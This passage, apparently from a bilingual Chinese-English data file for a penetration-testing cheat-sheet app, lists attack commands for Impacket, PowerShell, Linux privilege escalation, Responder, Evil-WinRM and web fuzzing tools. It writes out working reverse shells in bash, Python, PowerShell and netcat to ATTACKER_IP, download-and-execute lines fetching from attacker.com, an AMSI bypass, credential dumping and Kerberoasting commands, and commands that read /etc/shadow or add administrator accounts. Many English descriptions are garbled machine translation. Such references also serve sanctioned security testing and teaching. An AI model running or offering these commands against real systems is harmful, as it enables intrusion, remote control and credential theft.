        command: 'wmiexec.py domain/user:password@target_ip',
        description: { zh: 'WMI远程执行', en: 'WMIRemote Execution' },
        platform: 'linux'
      },
      {
        name: 'ATExec',
        command: 'atexec.py domain/user:password@target_ip "command"',
        description: { zh: '通过计划任务执行', en: 'Execute via scheduled task' },
        platform: 'linux'
      },
      {
        name: 'SMBExec',
        command: 'smbexec.py domain/user:password@target_ip',
        description: { zh: 'SMB远程执行', en: 'SMBRemote Execution' },
        platform: 'linux'
      },
      {
        name: 'SecretsDump',
        command: 'secretsdump.py domain/user:password@target_ip',
        description: { zh: '导出所有凭证', en: 'ExportallCredentials' },
        platform: 'linux'
      },
      {
        name: 'GetUserSPNs',
        command: 'GetUserSPNs.py domain/user:password -dc-ip dc_ip -request',
        description: { zh: 'Kerberoasting攻击', en: 'Kerberoasting Attack' },
        platform: 'linux'
      },
      {
        name: 'GetNPUsers',
        command: 'GetNPUsers.py domain/ -usersfile users.txt -format hashcat',
        description: { zh: 'AS-REP Roasting攻击', en: 'AS-REP RoastingAttack' },
        platform: 'linux'
      },
      {
        name: 'NTLM Relay',
        command: 'ntlmrelayx.py -tf targets.txt -smb2support',
        description: { zh: 'NTLM中继攻击', en: 'NTLMRelayAttack' },
        platform: 'linux'
      },
      {
        name: 'MSSQLClient',
        command: 'mssqlclient.py domain/user:password@target_ip',
        description: { zh: 'MSSQL客户端', en: 'MSSQLClient' },
        platform: 'linux'
      },
      {
        name: 'LookupsID',
        command: 'lookupsid.py domain/user:password@target_ip',
        description: { zh: '通过LSA枚举用户', en: 'throughLSAEnumerationUsers' },
        platform: 'linux'
      }
    ],
    references: ['https://github.com/SecureAuthCorp/impacket']
  },
  {
    id: 'powershell-pentest',
    name: { zh: 'PowerShell渗透命令', en: 'PowerShell Pentest Commands' },
    description: { zh: 'PowerShell渗透测试常用命令', en: 'Common PowerShell commands for penetration testing' },
    category: { zh: 'Windows渗透', en: 'Windows Penetration' },
    commands: [
      {
        name: { zh: '执行策略绕过', en: 'Execution Policy Bypass' },
        command: 'powershell -ExecutionPolicy Bypass -File script.ps1',
        description: { zh: '绕过执行策略运行脚本', en: 'BypassExecuteStrategyRunScript' },
        syntaxBreakdown: [
          { part: '-ExecutionPolicy Bypass', explanation: { zh: '绕过执行策略', en: 'BypassExecuteStrategy' }, type: 'parameter' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '远程下载执行', en: 'Remote Download & Execute' },
        command: 'IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/script.ps1")',
        description: { zh: '从远程下载并执行脚本', en: 'from RemoteDownload and ExecuteScript' },
        syntaxBreakdown: [
          { part: 'IEX', explanation: { zh: 'Invoke-Expression，执行字符串', en: 'Invoke-Expression, Executestring' }, type: 'command' },
          { part: 'Net.WebClient', explanation: { zh: 'Web客户端类', en: 'WebClientClass' }, type: 'value' },
          { part: 'DownloadString', explanation: { zh: '下载字符串内容', en: 'DownloadstringContent' }, type: 'value' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '编码执行', en: 'Encoded Execution' },
        command: 'powershell -EncodedCommand BASE64_ENCODED_COMMAND',
        description: { zh: '使用Base64编码执行命令', en: 'UseBase64 EncodingExecute Command' },
        syntaxBreakdown: [
          { part: '-EncodedCommand', explanation: { zh: 'Base64编码的命令', en: 'Base64 Encoding Command' }, type: 'parameter' }
        ],
        platform: 'windows'
      },
      {
        name: { zh: '获取系统信息', en: 'Get System Info' },
        command: 'Get-ComputerInfo\nsysteminfo\nGet-WmiObject -Class Win32_OperatingSystem',
        description: { zh: '获取系统信息', en: 'Get System Info' },
        platform: 'windows'
      },
      {
        name: { zh: '获取进程', en: 'Get Processes' },
        command: 'Get-Process | Select-Object Name,Id,Path\nGet-WmiObject Win32_Process | Select-Object Name,ProcessId,CommandLine',
        description: { zh: '获取运行进程', en: 'ObtainRunProcess' },
        platform: 'windows'
      },
      {
        name: { zh: '获取服务', en: 'Get Services' },
        command: 'Get-Service | Where-Object {$_.Status -eq "Running"}\nGet-WmiObject Win32_Service | Select-Object Name,State,StartName',
        description: { zh: '获取服务信息', en: 'Get ServicesInformation' },
        platform: 'windows'
      },
      {
        name: { zh: '网络连接', en: 'Network Connections' },
        command: 'Get-NetTCPConnection | Select-Object LocalAddress,LocalPort,OwningProcess\nnetstat -ano',
        description: { zh: '获取网络连接', en: 'ObtainNetwork Connections' },
        platform: 'windows'
      },
      {
        name: { zh: '用户信息', en: 'User Info' },
        command: 'Get-LocalUser\nnet user\nnet localgroup administrators',
        description: { zh: '获取用户信息', en: 'ObtainUser Info' },
        platform: 'windows'
      },
      {
        name: { zh: '端口扫描', en: 'Port Scanning' },
        command: '1..1024 | % {Test-NetConnection -Port $_ -ComputerName target_ip}',
        description: { zh: '简单端口扫描', en: 'simplePort Scanning' },
        platform: 'windows'
      },
      {
        name: { zh: '文件搜索', en: 'File Search' },
        command: 'Get-ChildItem -Path C:\\ -Include *.txt,*.doc,*.xls -Recurse -ErrorAction SilentlyContinue',
        description: { zh: '搜索敏感文件', en: 'SearchSensitive Files' },
        platform: 'windows'
      },
      {
        name: { zh: 'AMSI绕过', en: 'AMSI Bypass' },
        command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
        description: { zh: '绕过AMSI检测', en: 'BypassAMSIDetection' },
        platform: 'windows'
      }
    ],
    references: ['https://github.com/darkoperator/Posh-SecMod']
  },
  {
    id: 'linux-privilege',
    name: { zh: 'Linux提权命令', en: 'LinuxPrivilege escalationCommand' },
    description: { zh: 'Linux系统提权常用命令', en: 'LinuxSystemPrivilege escalationCommonCommand' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      {
        name: { zh: '系统信息', en: 'System Info' },
        command: 'uname -a\ncat /etc/issue\ncat /etc/*-release\ncat /proc/version',
        description: { zh: '获取系统版本信息', en: 'ObtainSystemVersionInformation' },
        platform: 'linux'
      },
      {
        name: { zh: '用户信息', en: 'User Info' },
        command: 'id\nwhoami\nw\nlast\ncat /etc/passwd\ncat /etc/shadow',
        description: { zh: '获取用户信息', en: 'ObtainUser Info' },
        platform: 'linux'
      },
      {
        name: { zh: 'SUID文件', en: 'SUID Files' },
        command: 'find / -perm -4000 -type f 2>/dev/null\nfind / -perm -u=s -type f 2>/dev/null',
        description: { zh: '查找SUID权限文件', en: 'FindSUIDPermissionFile' },
        syntaxBreakdown: [
          { part: '-perm -4000', explanation: { zh: 'SUID权限位', en: 'SUIDPermissionbit' }, type: 'parameter' },
          { part: '-type f', explanation: { zh: '文件类型', en: 'FileType' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: 'SUDO配置', en: 'SUDO Configuration' },
        command: 'sudo -l\ncat /etc/sudoers',
        description: { zh: '查看SUDO权限配置', en: 'View SUDO permission configuration' },
        platform: 'linux'
      },
      {
        name: { zh: '可写目录', en: 'Writable Directories' },
        command: 'find / -writable -type d 2>/dev/null\nfind / -perm -222 -type d 2>/dev/null',
        description: { zh: '查找可写目录', en: 'FindWritable Directories' },
        platform: 'linux'
      },
      {
        name: { zh: '内核漏洞', en: 'Kernel Exploits' },
        command: 'searchsploit linux kernel $(uname -r)\n./linux-exploit-suggester.sh',
        description: { zh: '搜索内核漏洞', en: 'SearchKernel Exploits' },
        platform: 'linux'
      },
      {
        name: { zh: 'Cron任务', en: 'Cron Jobs' },
        command: 'cat /etc/crontab\nls -la /etc/cron*\ncrontab -l',
        description: { zh: '查看计划任务', en: 'View scheduled tasks' },
        platform: 'linux'
      },
      {
        name: { zh: '环境变量', en: 'Environment Variable' },
        command: 'env\nset\necho $PATH',
        description: { zh: '查看环境变量', en: 'View environment variables' },
        platform: 'linux'
      },
      {
        name: { zh: '敏感文件', en: 'Sensitive Files' },
        command: 'cat /root/.bash_history\ncat ~/.ssh/authorized_keys\ncat /etc/shadow\nfind / -name "*.key" 2>/dev/null',
        description: { zh: '查找敏感文件', en: 'FindSensitive Files' },
        platform: 'linux'
      },
      {
        name: { zh: 'Docker逃逸', en: 'Docker Escape' },
        command: 'cat /proc/1/cgroup\nfdisk -l\ncapsh --print',
        description: { zh: '检测Docker环境', en: 'DetectionDockerEnvironment' },
        platform: 'linux'
      }
    ],
    references: ['https://gtfobins.github.io/']
  },
  {
    id: 'gobuster',
    name: 'Gobuster',
    description: { zh: '目录和子域名爆破工具', en: 'Directory and Subdomain Brute ForceTools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'apt install gobuster',
    commands: [
      {
        name: { zh: '目录爆破', en: 'Directory Brute Force' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt',
        description: { zh: '爆破网站目录', en: 'Brute forceWebsiteDirectory' },
        syntaxBreakdown: [
          { part: 'gobuster', explanation: { zh: 'Gobuster工具', en: 'GobusterTools' }, type: 'command' },
          { part: 'dir', explanation: { zh: '目录爆破模式', en: 'Directory Brute ForceMode' }, type: 'value' },
          { part: '-u', explanation: { zh: '目标URL', en: 'TargetURL' }, type: 'parameter' },
          { part: '-w', explanation: { zh: '字典文件', en: 'DictionaryFile' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '指定扩展名', en: 'Specify Extensions' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt',
        description: { zh: '指定文件扩展名', en: 'specifiedFileExtensionname' },
        syntaxBreakdown: [
          { part: '-x', explanation: { zh: '文件扩展名', en: 'FileExtensionname' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '子域名爆破', en: 'Subdomain Brute Force' },
        command: 'gobuster dns -d target.com -w subdomains.txt',
        description: { zh: '爆破子域名', en: 'Brute forceSub-Domain name' },
        syntaxBreakdown: [
          { part: 'dns', explanation: { zh: 'DNS爆破模式', en: 'DNSBrute forceMode' }, type: 'value' },
          { part: '-d', explanation: { zh: '目标域名', en: 'TargetDomain name' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '使用Cookie', en: 'Using Cookie' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -c "PHPSESSID=xxx"',
        description: { zh: '使用Cookie认证', en: 'Using CookieAuthentication' },
        syntaxBreakdown: [
          { part: '-c', explanation: { zh: '设置Cookie', en: 'Set cookie' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '添加Header', en: 'Add Header' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -H "Authorization: Bearer token"',
        description: { zh: '添加自定义Header', en: 'AddCustomHeader' },
        syntaxBreakdown: [
          { part: '-H', explanation: { zh: '添加Header', en: 'Add Header' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '线程设置', en: 'Thread Settings' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -t 50',
        description: { zh: '设置线程数', en: 'Setthread count' },
        syntaxBreakdown: [
          { part: '-t', explanation: { zh: '线程数', en: 'thread count' }, type: 'parameter' }
        ],
        platform: 'linux'
      },
      {
        name: { zh: '忽略状态码', en: 'Ignore Status Codes' },
        command: 'gobuster dir -u http://target.com -w wordlist.txt -b 404,403',
        description: { zh: '忽略特定状态码', en: 'Ignore specific status codes' },
        syntaxBreakdown: [
          { part: '-b', explanation: { zh: '黑名单状态码', en: 'BlackliststatusCode' }, type: 'parameter' }
        ],
        platform: 'linux'
      }
    ],
    references: ['https://github.com/OJ/gobuster']
  },
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    description: { zh: 'Web安全测试平台', en: 'WebSecurityTestPlatform' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: { zh: '下载安装包', en: 'DownloadInstallationPackage' },
    commands: [
      { name: { zh: '代理设置', en: 'Proxy Settings' }, command: 'Proxy -> Options -> Proxy Listeners -> Add -> Port 8080', description: { zh: '配置代理监听', en: 'Configure Proxylistening' }, platform: 'all' },
      { name: { zh: '拦截请求', en: 'Intercept Request' }, command: 'Proxy -> Intercept -> Intercept is on', description: { zh: '开启请求拦截', en: 'EnableRequestInterception' }, platform: 'all' },
      { name: { zh: '发送到Repeater', en: 'Send to Repeater' }, command: '右键 -> Send to Repeater (Ctrl+R)', description: { zh: '发送请求到Repeater', en: 'Send request to Repeater' }, platform: 'all' },
      { name: { zh: '发送到Intruder', en: 'Send to Intruder' }, command: '右键 -> Send to Intruder (Ctrl+I)', description: { zh: '发送请求到Intruder', en: 'Send request to Intruder' }, platform: 'all' },
      { name: { zh: 'Intruder攻击类型', en: 'Intruder Attack Types' }, command: 'Sniper: 单个payload\nBattering ram: 同一payload\nPitchfork: 多个payload并行\nCluster bomb: 多个payload组合', description: { zh: '四种攻击类型说明', en: 'Four attack type descriptions' }, platform: 'all' },
      { name: { zh: '扫描', en: 'Scan' }, command: 'Dashboard -> New Scan -> 选择目标URL', description: { zh: '启动主动扫描', en: 'Start active scanning' }, platform: 'all' },
      { name: { zh: '插件安装', en: 'Plugin Installation' }, command: 'Extender -> BApp Store -> 选择插件 -> Install', description: { zh: '安装BApp插件', en: 'Install BApp plugin' }, platform: 'all' },
      { name: { zh: '导出请求', en: 'Export Request' }, command: '右键 -> Copy to clipboard -> Request', description: { zh: '复制请求内容', en: 'Copy request content' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/burp/documentation']
  },
  {
    id: 'ffuf',
    name: 'FFUF',
    description: { zh: '快速Web模糊测试工具', en: 'Fast web fuzzing tool' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    installation: 'go install github.com/ffuf/ffuf/v2@latest',
    commands: [
      { name: { zh: '目录爆破', en: 'Directory Brute Force' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt', description: { zh: '基础目录爆破', en: 'BasicDirectory Brute Force' }, platform: 'linux' },
      { name: { zh: '指定扩展名', en: 'Specify Extensions' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt', description: { zh: '添加文件扩展名', en: 'AddFileExtensionname' }, platform: 'linux' },
      { name: { zh: '参数模糊测试', en: 'Parameter Fuzzing' }, command: 'ffuf -u http://target.com/?param=FUZZ -w wordlist.txt', description: { zh: 'GET参数测试', en: 'GETParameterTest' }, platform: 'linux' },
      { name: { zh: 'POST测试', en: 'POST Test' }, command: 'ffuf -u http://target.com -X POST -d "user=FUZZ&pass=test" -w wordlist.txt', description: { zh: 'POST数据测试', en: 'POSTDataTest' }, platform: 'linux' },
      { name: { zh: 'Header测试', en: 'Header Test' }, command: 'ffuf -u http://target.com -H "Host: FUZZ.target.com" -w wordlist.txt', description: { zh: 'Host头测试', en: 'HostHeaderTest' }, platform: 'linux' },
      { name: { zh: '过滤状态码', en: 'Filter Status Codes' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -mc 200,301,302', description: { zh: '匹配特定状态码', en: 'MatchspecificstatusCode' }, platform: 'linux' },
      { name: { zh: '过滤响应大小', en: 'Filter Response Size' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -fs 1234', description: { zh: '过滤特定响应大小', en: 'FilterspecificResponsesize' }, platform: 'linux' },
      { name: { zh: '递归扫描', en: 'Recursive Scan' }, command: 'ffuf -u http://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 2', description: { zh: '递归目录扫描', en: 'recursiveDirectoryScan' }, platform: 'linux' }
    ],
    references: ['https://github.com/ffuf/ffuf']
  },
  {
    id: 'responder',
    name: 'Responder',
    description: 'LLMNR/NBT-NS/MDNS Poisoner',
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install responder',
    commands: [
      { name: { zh: '启动监听', en: 'Start Listener' }, command: 'responder -I eth0', description: { zh: '启动Responder监听', en: 'StartResponderlistening' }, platform: 'linux' },
      { name: { zh: '分析模式', en: 'Analysis Mode' }, command: 'responder -I eth0 -A', description: { zh: '被动分析模式', en: 'Passive analysis mode' }, platform: 'linux' },
      { name: { zh: 'WPAD攻击', en: 'WPAD Attack' }, command: 'responder -I eth0 -wF', description: { zh: '启用WPAD代理攻击', en: 'EnableWPADProxyAttack' }, platform: 'linux' },
      { name: { zh: 'Finger服务', en: 'Finger Service' }, command: 'responder -I eth0 -f', description: { zh: '启用Finger服务', en: 'EnableFinger Service' }, platform: 'linux' },
      { name: { zh: '禁用SMB', en: 'Disable SMB' }, command: 'responder -I eth0 --disable-smb', description: { zh: '禁用SMB服务', en: 'Disable SMBService' }, platform: 'linux' },
      { name: { zh: '查看哈希', en: 'View Hashes' }, command: 'cat /usr/share/responder/logs/*.txt', description: { zh: '查看捕获的哈希', en: 'View captured hashes' }, platform: 'linux' },
      { name: { zh: 'DHCP欺骗', en: 'DHCP Spoofing' }, command: 'responder -I eth0 -D', description: { zh: '启用DHCP欺骗', en: 'EnableDHCP Spoofing' }, platform: 'linux' }
    ],
    references: ['https://github.com/lgandx/Responder']
  },
  {
    id: 'evil-winrm',
    name: 'Evil-WinRM',
    description: { zh: 'WinRM远程管理工具', en: 'WinRMRemoteManagementTools' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'gem install evil-winrm',
    commands: [
      { name: { zh: '密码连接', en: 'Password Connection' }, command: 'evil-winrm -i target_ip -u user -p password', description: { zh: '使用密码连接', en: 'UsePassword Connection' }, platform: 'linux' },
      { name: { zh: '哈希连接', en: 'Hash Connection' }, command: 'evil-winrm -i target_ip -u user -H ntlm_hash', description: { zh: '使用哈希连接', en: 'Using HashConnection' }, platform: 'linux' },
      { name: { zh: '上传文件', en: 'Upload File' }, command: 'upload local_file remote_path', description: { zh: '上传文件到目标', en: 'Upload File to Target' }, platform: 'linux' },
      { name: { zh: '下载文件', en: 'Download File' }, command: 'download remote_path local_file', description: { zh: '从目标下载文件', en: 'from TargetDownload File' }, platform: 'linux' },
      { name: { zh: '加载脚本', en: 'Load Script' }, command: 'menu\nBypass-4MSI\nInvoke-Mimikatz', description: { zh: '加载PowerShell脚本', en: 'LoadPowerShellScript' }, platform: 'linux' },
      { name: { zh: '执行命令', en: 'Execute Command' }, command: 'Invoke-Command -ScriptBlock {whoami}', description: { zh: '执行PowerShell命令', en: 'Execute PowerShellCommand' }, platform: 'linux' }
    ],
    references: ['https://github.com/Hackplayers/evil-winrm']
  },
  {
    id: 'proxychains',
    name: 'ProxyChains',
    description: { zh: '代理链工具', en: 'ProxyChainTools' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    installation: 'apt install proxychains4',
    commands: [
      { name: { zh: '配置代理', en: 'Configure Proxy' }, command: 'vim /etc/proxychains4.conf\n[ProxyList]\nsocks5 127.0.0.1 1080', description: { zh: '配置SOCKS代理', en: 'ConfigurationSOCKS Proxy' }, platform: 'linux' },
      { name: { zh: '使用代理', en: 'Using Proxy' }, command: 'proxychains4 nmap -sT -Pn target_ip', description: { zh: '通过代理运行工具', en: 'throughProxyRunTools' }, platform: 'linux' },
      { name: { zh: '动态链', en: 'Dynamic Chain' }, command: 'dynamic_chain\n[ProxyList]\nsocks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081', description: { zh: '动态代理链', en: 'Dynamic proxy chain' }, platform: 'linux' },
      { name: { zh: '严格链', en: 'Strict Chain' }, command: 'strict_chain', description: { zh: '严格按顺序使用代理', en: 'Strict sequential proxy usage' }, platform: 'linux' },
      { name: { zh: '随机链', en: 'Random Chain' }, command: 'random_chain', description: { zh: '随机选择代理', en: 'Random proxy selection' }, platform: 'linux' }
    ],
    references: ['https://github.com/haad/proxychains']
  },
  {
    id: 'bash-reverse',
    name: { zh: 'Bash反弹Shell', en: 'BashReverse Shell' },
    description: { zh: 'Bash反弹Shell命令', en: 'BashReverse ShellCommand' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '基础反弹', en: 'Basic Reverse Shell' }, command: 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1', description: { zh: '基础Bash反弹', en: 'Basic Bash reverse shell' }, platform: 'linux' },
      { name: { zh: 'exec反弹', en: 'exec Reverse Shell' }, command: 'exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do $line 2>&5 >&5; done', description: { zh: 'exec方式反弹', en: 'exec method reverse shell' }, platform: 'linux' },
      { name: { zh: 'UDP反弹', en: 'UDP Reverse Shell' }, command: 'bash -i >& /dev/udp/ATTACKER_IP/PORT 0>&1', description: { zh: 'UDP反弹', en: 'UDP Reverse Shell' }, platform: 'linux' },
      { name: { zh: '编码反弹', en: 'Encoded Reverse Shell' }, command: 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"', description: { zh: 'bash -c执行', en: 'bash -cExecute' }, platform: 'linux' },
      { name: { zh: '监听命令', en: 'Listener Command' }, command: 'nc -lvnp PORT', description: { zh: 'Netcat监听', en: 'Netcatlistening' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'python-reverse',
    name: { zh: 'Python反弹Shell', en: 'Python Reverse ShellShell' },
    description: { zh: 'Python反弹Shell命令', en: 'Python Reverse ShellShellCommand' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: 'Python反弹', en: 'Python Reverse Shell' }, command: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', description: { zh: 'Python反弹Shell', en: 'Python Reverse ShellShell' }, platform: 'linux' },
      { name: { zh: 'Python3反弹', en: 'Python3 Reverse Shell' }, command: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'', description: { zh: 'Python3反弹', en: 'Python3 Reverse Shell' }, platform: 'linux' },
      { name: { zh: '短版本', en: 'Short Version' }, command: 'python -c \'import pty;pty.spawn("/bin/bash")\'', description: { zh: '获取完整TTY', en: 'ObtaincompleteTTY' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'powershell-reverse',
    name: { zh: 'PowerShell反弹Shell', en: 'PowerShellReverse Shell' },
    description: { zh: 'PowerShell反弹Shell命令', en: 'PowerShellReverse ShellCommand' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '基础反弹', en: 'Basic Reverse Shell' }, command: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"', description: { zh: 'PowerShell反弹', en: 'PowerShell reverse shell' }, platform: 'windows' },
      { name: { zh: 'Base64编码', en: 'Base64 Encoding' }, command: 'powershell -e BASE64_ENCODED_COMMAND', description: { zh: 'Base64编码执行', en: 'Base64 EncodingExecute' }, platform: 'windows' },
      { name: 'PowerCat', command: 'powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\'http://attacker.com/powercat.ps1\');powercat -c ATTACKER_IP -p PORT -e cmd"', description: { zh: '使用PowerCat', en: 'UsePowerCat' }, platform: 'windows' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nc-reverse',
    name: { zh: 'Netcat反弹Shell', en: 'NetcatReverse Shell' },
    description: { zh: 'Netcat反弹Shell命令', en: 'NetcatReverse ShellCommand' },
    category: { zh: '反弹Shell', en: 'Reverse Shell' },
    commands: [
      { name: { zh: '传统反弹', en: 'Traditional Reverse Shell' }, command: 'nc -e /bin/sh ATTACKER_IP PORT', description: { zh: '传统nc反弹', en: 'Traditional nc reverse shell' }, platform: 'linux' },
      { name: { zh: 'OpenBSD反弹', en: 'OpenBSD Reverse Shell' }, command: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f', description: { zh: 'OpenBSD nc反弹', en: 'OpenBSD nc reverse shell' }, platform: 'linux' },
      { name: { zh: '监听模式', en: 'Listener Mode' }, command: 'nc -lvnp PORT', description: { zh: '监听连接', en: 'listeningConnection' }, platform: 'linux' },
      { name: { zh: '文件传输', en: 'File Transfer' }, command: 'nc -lvnp PORT < file    # 发送端\nnc ATTACKER_IP PORT > file    # 接收端', description: { zh: '通过nc传输文件', en: 'Transfer files via nc' }, platform: 'linux' }
    ],
    references: ['https://www.revshells.com/']
  },
  {
    id: 'nuclei',
    name: 'Nuclei',
    description: { zh: '快速漏洞扫描工具', en: 'Fast vulnerability scanning tool' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest',
    commands: [
      { name: { zh: '基础扫描', en: 'Basic Scan' }, command: 'nuclei -u http://target.com', description: { zh: '使用所有模板扫描', en: 'UseallTemplateScan' }, platform: 'linux' },
      { name: { zh: '指定模板', en: 'Specify Template' }, command: 'nuclei -u http://target.com -t cves/', description: { zh: '使用CVE模板', en: 'UseCVETemplate' }, platform: 'linux' },
      { name: { zh: '严重级别', en: 'Severity Level' }, command: 'nuclei -u http://target.com -severity critical,high', description: { zh: '指定漏洞严重级别', en: 'specifiedVulnerabilitySeverity Level' }, platform: 'linux' },
      { name: { zh: '批量扫描', en: 'Batch Scan' }, command: 'nuclei -l urls.txt', description: { zh: '从文件读取目标', en: 'from File ReadTarget' }, platform: 'linux' },
      { name: { zh: '更新模板', en: 'Update Templates' }, command: 'nuclei -update-templates', description: { zh: '更新模板库', en: 'Update Templatesdatabase' }, platform: 'linux' },
      { name: { zh: '输出结果', en: 'Output Results' }, command: 'nuclei -u http://target.com -o results.txt', description: { zh: '保存扫描结果', en: 'SaveScanResult' }, platform: 'linux' },
      { name: { zh: 'JSON输出', en: 'JSON Output' }, command: 'nuclei -u http://target.com -json -o results.json', description: { zh: 'JSON格式输出', en: 'JSONFormatOutput' }, platform: 'linux' }
    ],
    references: ['https://nuclei.projectdiscovery.io/']
  },
  {
    id: 'windows-cmd',
    name: { zh: 'Windows CMD命令', en: 'Windows CMDCommand' },
    description: { zh: 'Windows系统常用命令', en: 'WindowsSystemCommonCommand' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '系统信息', en: 'System Info' }, command: 'systeminfo\nver\nhostname', description: { zh: '获取系统信息', en: 'Get System Info' }, platform: 'windows' },
      { name: { zh: '用户管理', en: 'User Management' }, command: 'net user\nnet user username password /add\nnet localgroup administrators username /add', description: { zh: '用户管理命令', en: 'User ManagementCommand' }, platform: 'windows' },
      { name: { zh: '网络配置', en: 'Network Configuration' }, command: 'ipconfig /all\nnetstat -ano\nnetstat -anob\nroute print\narp -a', description: { zh: '网络配置信息', en: 'Network ConfigurationInformation' }, platform: 'windows' },
      { name: { zh: '进程管理', en: 'Process Management' }, command: 'tasklist\ntaskkill /PID pid /F\nwmic process list full', description: { zh: '进程管理命令', en: 'Process ManagementCommand' }, platform: 'windows' },
      { name: { zh: '服务管理', en: 'Service Management' }, command: 'sc query\nsc start servicename\nsc stop servicename\nnet start', description: { zh: '服务管理命令', en: 'Service ManagementCommand' }, platform: 'windows' },
      { name: { zh: '文件操作', en: 'File Operations' }, command: 'dir /s /b c:\\*.txt\ntype filename\nfind "string" filename\nicacls filename', description: { zh: '文件操作命令', en: 'File OperationsCommand' }, platform: 'windows' },
      { name: { zh: '注册表操作', en: 'Registry Operations' }, command: 'reg query HKLM\\Software\nreg add HKLM\\Software\\MyKey /v Value /t REG_SZ /d "Data" /f\nreg delete HKLM\\Software\\MyKey /f', description: { zh: '注册表操作', en: 'Registry Operations' }, platform: 'windows' },
      { name: { zh: '防火墙', en: 'Firewall' }, command: 'netsh advfirewall show allprofiles\nnetsh advfirewall firewall add rule name="Allow Port" dir=in action=allow protocol=tcp localport=8080', description: { zh: '防火墙配置', en: 'FirewallConfiguration' }, platform: 'windows' }
    ],
    references: ['https://ss64.com/nt/']
  },
  {
    id: 'net-commands',
    name: { zh: 'NET命令集合', en: 'NET Command Collection' },
    description: { zh: 'Windows NET命令完整集合', en: 'Complete Windows NET command collection' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: '用户列表', en: 'User List' }, command: 'net user', description: { zh: '列出所有用户', en: 'ListallUsers' }, platform: 'windows' },
      { name: { zh: '用户详情', en: 'User Details' }, command: 'net user username', description: { zh: '查看用户详细信息', en: 'View detailed user information' }, platform: 'windows' },
      { name: { zh: '添加用户', en: 'Add User' }, command: 'net user username password /add', description: { zh: '添加新用户', en: 'Add a new user' }, platform: 'windows' },
      { name: { zh: '删除用户', en: 'Delete User' }, command: 'net user username /delete', description: { zh: '删除用户', en: 'Delete User' }, platform: 'windows' },
      { name: { zh: '组列表', en: 'Group List' }, command: 'net localgroup', description: { zh: '列出所有本地组', en: 'ListallLocalGroups' }, platform: 'windows' },
      { name: { zh: '添加到管理员组', en: 'Add to Admin Group' }, command: 'net localgroup administrators username /add', description: { zh: '将用户添加到管理员组', en: 'will UsersAdd to Admin Group' }, platform: 'windows' },
      { name: { zh: '域用户', en: 'Domain Users' }, command: 'net user /domain', description: { zh: '列出域用户', en: 'ListDomain Users' }, platform: 'windows' },
